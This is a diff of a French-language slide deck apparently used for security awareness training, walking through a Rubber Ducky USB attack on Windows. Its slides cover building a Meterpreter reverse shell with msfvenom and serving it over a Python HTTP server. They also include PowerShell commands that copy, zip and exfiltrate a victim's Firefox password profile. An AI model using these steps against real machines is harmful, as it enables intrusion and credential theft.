@@ -66,110 +66,103 @@ Note: le logo n'est pas present sur la version de production
 
 ---
 
-# Demo
-
----
-
-Voici a quoi ressemble du code pour le rubber ducky;
-
-![img](assets/duckscript.jpg)
-
-Il faut ensuite le compiler pour le mettre dans la clée usb:
+# Compilation
 
 ![img](assets/comp.png)
 
+Note:
+- le compilateur est fournit en .jar c'est du java compilé et packagé
+- `-i` input
+- `-l` output, doit tjs etre inject.bin
+- le plus important `-l` clavier
+
 ---
 
-## Desactivation de windows defender et reverse shell
-
-Pour desactiver windows defender une combinaison de touche suffit.
-En revanche pour obtenir un reverse shell, il faut preparer unpeu ..
-
-![img](assets/ex.jpg)
-
-#### Creations de l'executable et setup du server meterpreter
-
-On utilise Msfvenom pour creer le payoad et Metasploit pour le server Meterpreter (cest sur celui ci que la victime va se connecter:
-
-##### Meterpreter:
+## Reverse shell
 
 ![img](assets/msfv.png)
 
-```
--a: l'architecture
---platform: la plateforme (windows, android, *nix...)
--p: Le paylaod, dans ce cas meterpreter reverse_tcp
-LHOST: l'ip du server meterpreter
-LPORT: le port du server meterpreter
--e: l'encoding
--f: le format
-> /tmp/mad/666.exe: la destination
-```
-
-##### Metasploit
-
-![img](assets/msf.png)
+Note:
+- Un reverse shell est un programme qui permet d'obtennir un acces distant pour
+  executer des commandes
+- Le but est de l'executer sur la machine de la victime pour qu'il se
+  connecte a un shell qu'on a mit en ecoute de connection sur un serveur
+- On utilise Msfvenom pour creer le payoad et Metasploit pour le server
+  Meterpreter (cest sur celui ci que la victime va se connecter:
+- `-a`: l'architecture CPU
+- `--platform`: la plateforme (windows, android, nix...)
+- `-p`: Le paylaod, dans ce cas meterpreter reverse_tcp
+- `LHOST`: l'ip du server meterpreter
+- `LPORT`: le port du server meterpreter
+- `-e`: l'encoding
+- `-f`: le format
+- `>` /tmp/mad/666.exe: la destination
 
 ---
 
-Une fois pret on utilise un petit server http pour que la victime puisse telecharger notre exe malvaillante
+# Distribution
 
 ```
 cd /tmp/mad && python -m http.server
 # Sous ubuntu, debian... il faut utiliser python3 -m http.server
 # car python = python2 sous ArchLinux python = python3
 ```
----
 
-#### Let's plug the usb :)
-
-(voir windoz.mp4)
-
-Apres 20 seconde voila ce que ce passe sur le server meterpreter:
-
-![im](/sess.png)
-
-on a un reverse shell :)
-
-![img](assets/revshell.png)
+Note:
+Une fois pret on utilise un petit server http pour que la victime puisse telecharger notre exe malvaillante
 
 ---
 
-#### Exemples
-
-Voici un exemple de ce que l'on peut faire une fois que l'on a reverse shell:
-
-- Vol de mots de passe firefox
-- Keylogger
-- Screen capture
-- Downloader et uploader des fichiers
-- Implementation d'un ransome ware
-- Reconnaissance et mouvement transversaux dans le reseau
+![img](assets/msf.png)
 
 ---
 
-##### Vol de mots de passe Firefox
+# Demo
 
-Dans notre sessions meterpreter on zip les fichiers de profile firefox:
+---?video=https://yourlabs.io/oss/security/raw/master/assets/ducky-windoz.mp4
+
+Note:
+- Conclusion: ne ramassez pas les clefs usb que vous trouvez dans la rue
+
+---?video=https://yourlabs.io/oss/security/raw/master/assets/ducky-windoz.mp4
+---
+
+## Usages
+
+- Vol de mots de passe firefox |
+- Keylogger |
+- Screen capture |
+- Downloader et uploader des fichiers |
+- Implementation d'un ransome ware |
+- Reconnaissance et mouvement transversaux dans le reseau |
+- ... |
+
+---
+
+## Vol de mots de passe Firefox
 
 ```
 meterpreter > shell
 > powershell
-
 > cd /users/<user> #(utilisez whoami pr le savoir)
-
 > copy-item /users/33768/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release -destination /windows/temp/mad.default-release -recurse
-
-#creer un zip de ce fichier avec:
 > Compress-Archive -Path /windows/temp/mad.default-release -DestinationPath /windows/temp/mad.default-release.zip
-```
-
-On exit 2 fois pour revenir au prompt `meterpreter >`
-et download le fichier que l'on vient de zipper
-
-```
+> exit
+> exit
 meterpreter > Download /windows/temp/mad.default-release.zip /tmp
 ```
+
+@[1](Lancer cmd)
+@[2](Lancer powershell)
+@[3-4](Copie des fichiers .default-release de firefox)
+@[5](Compression dans fichiers dans une archive zip)
+@[6-7](On exit 2 fois pour revenir au prompt `meterpreter >`)
+@[8](Exifltration de l'archive zip)
+
+Note:
+Dans notre sessions meterpreter on zip les fichiers de profile firefox:
+
+---
 
 Dans un autre terminal, on unzip et place les fichier dans le repetoir ~/.mozila/firefox
 
